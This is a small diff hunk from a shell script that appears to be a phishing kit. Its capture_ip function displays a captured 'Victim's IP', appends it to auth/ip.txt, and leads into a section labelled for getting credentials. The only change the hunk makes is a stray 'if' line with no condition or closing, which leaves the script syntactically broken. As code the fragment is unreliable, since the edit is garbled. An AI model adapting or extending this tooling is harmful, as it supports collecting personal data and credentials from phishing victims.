@@ -276,6 +276,7 @@ capture_ip() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
+    if
 }
 
 ## Get credentials
